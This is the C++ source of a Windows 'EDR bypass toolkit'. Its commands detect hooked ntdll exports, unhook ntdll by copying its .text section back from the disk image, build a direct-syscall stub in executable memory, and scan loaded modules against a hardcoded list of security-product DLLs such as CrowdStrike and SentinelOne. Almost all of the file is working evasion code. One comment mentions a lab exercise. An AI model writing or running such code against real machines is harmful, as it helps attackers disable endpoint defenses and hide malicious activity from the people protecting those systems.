// edr_bypass.cpp — EDR bypass toolkit
// Compile: g++ -std=c++17 -o edr_bypass.exe edr_bypass.cpp
// Usage: edr_bypass.exe detect-hooks | unhook | syscall <num_hex> | scan

#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string>
#include <vector>

// Known EDR DLL names (lowercase)
static const char* EDR_DLLS[] = {
    "sbiedll.dll",          // sandboxie
    "api_log.dll",
    "dir_watch.dll",
    "pstorec.dll",
    "vmcheck.dll",
    "wpespy.dll",
    "cmdvrt32.dll",
    "cmdvrt64.dll",
    "SxIn.dll",
    "sf2.dll",
    "snxhk.dll",
    "aswhook.dll",
    "hexhook64.dll",
    "CarbonBlack.dll",
    "CylanceSvc.dll",
    "CrWdHook64.dll",
    "SentinelOne",
    "CrowdStrike",
    nullptr
};

// ─── detect-hooks: walk ntdll exports, flag JMP patches ──────────────────────

static void cmd_detect_hooks() {
    HMODULE hMod = GetModuleHandleA("ntdll.dll");
    if (!hMod) { fprintf(stderr, "Cannot get ntdll handle\n"); return; }
    auto* base = (const uint8_t*)hMod;
    auto* dos  = (IMAGE_DOS_HEADER*)base;
    auto* nth  = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    auto* dir  = &nth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    auto* exp  = (IMAGE_EXPORT_DIRECTORY*)(base + dir->VirtualAddress);
    auto* names  = (DWORD*)(base + exp->AddressOfNames);
    auto* funcs  = (DWORD*)(base + exp->AddressOfFunctions);
    auto* ords   = (WORD* )(base + exp->AddressOfNameOrdinals);

    int hooked = 0;
    printf("=== Hook Detection (ntdll.dll) ===\n");
    for (DWORD i = 0; i < exp->NumberOfNames; ++i) {
        const char* name = (const char*)(base + names[i]);
        DWORD off = funcs[ords[i]];
        const uint8_t* fn = base + off;
        // E9 = relative JMP, FF25 = absolute JMP via IAT
        if (fn[0] == 0xE9 || (fn[0] == 0xFF && fn[1] == 0x25)) {
            printf("  [HOOKED] %-40s  0x%02X 0x%02X 0x%02X ...\n",
                   name, fn[0], fn[1], fn[2]);
            ++hooked;
        }
    }
    if (!hooked) printf("  No JMP-patched exports found.\n");
    printf("Total hooked: %d\n", hooked);
}

// ─── unhook: map ntdll from disk, overwrite .text ────────────────────────────

static void cmd_unhook() {
    printf("=== ntdll Unhook (disk copy) ===\n");

    char path[MAX_PATH]{};
    GetSystemDirectoryA(path, MAX_PATH);
    strcat_s(path, "\\ntdll.dll");

    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                               nullptr, OPEN_EXISTING, 0, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[!] Cannot open %s: %lu\n", path, GetLastError()); return;
    }
    HANDLE hMap = CreateFileMappingA(hFile, nullptr, PAGE_READONLY, 0, 0, nullptr);
    if (!hMap) { CloseHandle(hFile); return; }
    const uint8_t* disk = (const uint8_t*)MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    if (!disk) { CloseHandle(hMap); CloseHandle(hFile); return; }
    printf("[+] Mapped ntdll from disk: 0x%p\n", disk);

    HMODULE hMem = GetModuleHandleA("ntdll.dll");
    auto* dos_d  = (IMAGE_DOS_HEADER*)disk;
    auto* nth_d  = (IMAGE_NT_HEADERS*)(disk + dos_d->e_lfanew);
    auto* sec_d  = IMAGE_FIRST_SECTION(nth_d);
    WORD nsec    = nth_d->FileHeader.NumberOfSections;

    for (WORD i = 0; i < nsec; ++i) {
        if (memcmp(sec_d[i].Name, ".text", 5) == 0) {
            LPVOID target = (uint8_t*)hMem + sec_d[i].VirtualAddress;
            DWORD sz      = sec_d[i].SizeOfRawData;
            const void* src = disk + sec_d[i].PointerToRawData;

            DWORD old = 0;
            if (!VirtualProtect(target, sz, PAGE_EXECUTE_READWRITE, &old)) {
                fprintf(stderr, "[!] VirtualProtect failed: %lu\n", GetLastError());
                break;
            }
            memcpy(target, src, sz);
            VirtualProtect(target, sz, old, &old);
            printf("[+] .text section restored (%lu bytes) at 0x%p\n", sz, target);
            break;
        }
    }

    UnmapViewOfFile(disk);
    CloseHandle(hMap);
    CloseHandle(hFile);
}

// ─── syscall: inline direct syscall demonstration ────────────────────────────
// Uses NtQuerySystemInformation (syscall number varies by OS — we resolve dynamically)

static void cmd_syscall(const char* num_hex) {
    DWORD sysnum = (DWORD)strtoul(num_hex, nullptr, 16);
    printf("=== Direct Syscall: SSN=0x%X ===\n", sysnum);
    printf("[*] Demonstrating syscall stub execution for SSN 0x%X\n", sysnum);
    printf("[*] Allocating executable stub...\n");

    // Build a tiny syscall stub: mov eax, SSN; syscall; ret
    uint8_t stub[12] = {
        0xB8, 0x00,0x00,0x00,0x00,  // mov eax, <ssn>
        0x4C, 0x8B, 0xD1,           // mov r10, rcx
        0x0F, 0x05,                 // syscall
        0xC3                        // ret
    };
    stub[1] = (uint8_t)(sysnum & 0xFF);
    stub[2] = (uint8_t)((sysnum >> 8) & 0xFF);
    stub[3] = (uint8_t)((sysnum >> 16) & 0xFF);
    stub[4] = (uint8_t)((sysnum >> 24) & 0xFF);

    LPVOID mem = VirtualAlloc(nullptr, sizeof(stub),
                              MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) { fprintf(stderr, "[!] VirtualAlloc failed\n"); return; }
    memcpy(mem, stub, sizeof(stub));
    printf("[+] Stub at 0x%p: ", mem);
    for (auto b : stub) printf("%02X ", b);
    printf("\n[+] Stub ready — call it via a function pointer in your code\n");
    // (We don't call unknown SSNs blind — lab exercise is to look up SSN table)
    VirtualFree(mem, 0, MEM_RELEASE);
}

// ─── scan: enumerate loaded modules, flag EDR DLLs ───────────────────────────

static void cmd_scan() {
    printf("=== Loaded Module Scan ===\n");
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, GetCurrentProcessId());
    if (snap == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "Snapshot failed: %lu\n", GetLastError()); return;
    }
    MODULEENTRY32 me{ sizeof(me) };
    int flagged = 0;
    if (Module32First(snap, &me)) {
        do {
            std::string name(me.szModule);
            std::string low = name;
            for (auto& c : low) c = (char)tolower(c);
            bool hit = false;
            for (int i = 0; EDR_DLLS[i]; ++i) {
                if (low.find(EDR_DLLS[i]) != std::string::npos) { hit = true; break; }
            }
            if (hit) {
                printf("  [EDR] %-40s  %s\n", me.szModule, me.szExePath);
                ++flagged;
            }
        } while (Module32Next(snap, &me));
    }
    CloseHandle(snap);
    if (!flagged) printf("  No known EDR modules detected.\n");
    printf("Flagged: %d\n", flagged);
}

// ─── Main ─────────────────────────────────────────────────────────────────────

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Usage:\n"
               "  edr_bypass.exe detect-hooks\n"
               "  edr_bypass.exe unhook\n"
               "  edr_bypass.exe syscall <ssn_hex>\n"
               "  edr_bypass.exe scan\n");
        return 1;
    }
    std::string cmd(argv[1]);
    if      (cmd == "detect-hooks") cmd_detect_hooks();
    else if (cmd == "unhook")       cmd_unhook();
    else if (cmd == "syscall" && argc >= 3) cmd_syscall(argv[2]);
    else if (cmd == "scan")         cmd_scan();
    else { fprintf(stderr, "Unknown command.\n"); return 1; }
    return 0;
}
